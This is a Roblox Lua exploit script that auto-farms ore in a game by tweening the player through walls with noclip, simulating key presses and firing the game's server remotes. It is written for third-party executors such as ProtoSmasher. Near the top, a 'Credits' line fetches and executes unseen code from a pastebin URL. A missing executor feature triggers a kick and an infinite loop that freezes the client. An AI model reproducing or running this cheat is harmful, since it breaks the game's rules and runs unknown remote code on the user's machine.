--Settings
_G.Enabled = true; --Toggle On/Off
_G.Settings = {
    Speed = 50; --TP Speed
    Attempts = 5; --TP Attempts
    Ignore = { --Ignore List
        ["stone"] = true;
    }
}

--Variable
local RS = game:GetService("ReplicatedStorage")
local work = game:GetService("Workspace")
local player = game:GetService("Players").LocalPlayer

--Credits
loadstring(game:HttpGet("https://pastebin.com/raw/vJg6Sa8w", true))()

--NoClip
function noclip()
	Stepped = game:GetService('RunService').Stepped:Connect(function()
		if player.Character and player.Character:FindFirstChild("Humanoid") then 
			game.Players.LocalPlayer.Character.Humanoid:ChangeState(11)
		end
		if _G.Enabled == false then 
			Stepped:Disconnect()
		end
	end)
end

--Keypress
function key(code)
	if Input and Input.KeyDown then 
		--ProtoSmasher
		Input.KeyDown(code)
		wait()
		Input.KeyUp(code)
	elseif keypress then 
		keypress(code)
		wait()
		keyrelease(code)
	else
		player:Kick("Get a better exploit")
		wait()
		while true do end
	end
end

--Ignore Check
function ignore(instance)
    local e = string.split(instance.Name, "_")
    if _G.Settings.Ignore[e[1]:lower()] then
        return false
    else
        return true
    end
end

--Find Nearest
function nearest(Pose)
	local Closest
	local Distance = math.huge
	for _,v in pairs(work.Resources.Glade.Ores:GetChildren()) do
		if string.find(v.Name, "Rock") then
			if _G.Enabled and ignore(v) and v:FindFirstChild("MainPart") and v:FindFirstChild("Properties") and v.Properties:FindFirstChild("Alive") and v.Properties.Alive.Value == true and player.Character and player.Character:FindFirstChild("HumanoidRootPart") then 
				local newDistance = (v.MainPart.Position - Pose).magnitude
				if newDistance < Distance then
					Closest = v.MainPart
					Distance = newDistance
				end
			end
		end
	end
	return Closest
end

--TP
while _G.Enabled do
	if player.Character and player.Character:FindFirstChild("HumanoidRootPart") then
		local nearest = nearest(player.Character.HumanoidRootPart.Position)
		if nearest == nil then
			return
		end
		noclip()
		game:GetService("TweenService"):Create(player.Character.HumanoidRootPart, TweenInfo.new(player:DistanceFromCharacter(nearest.Position)/_G.Settings["Speed"], Enum.EasingStyle.Linear), {CFrame = nearest.CFrame}):Play()
		wait(player:DistanceFromCharacter(nearest.Position)/_G.Settings["Speed"])
		try = _G.Settings["Attempts"]
		repeat
			if nearest.Parent.Properties.Health:FindFirstChild(player.Name) then
				RS.Resources.Data.Events.Traffic.Gear:InvokeServer("Action", Vector3.new())
				try = math.huge
				wait()
			else
				key(0x45)
				wait(0.25)
				RS.Resources.Data.Events.Traffic.Gear:InvokeServer("Action", Vector3.new())
				wait(1)
			end
			wait()
			try = try - 1
		until _G.Enabled == false or try <= 0 or nearest.Parent.Properties.Health.Value <= 0 or player.Character == nil or player.Character.HumanoidRootPart == nil
	end
	wait()
end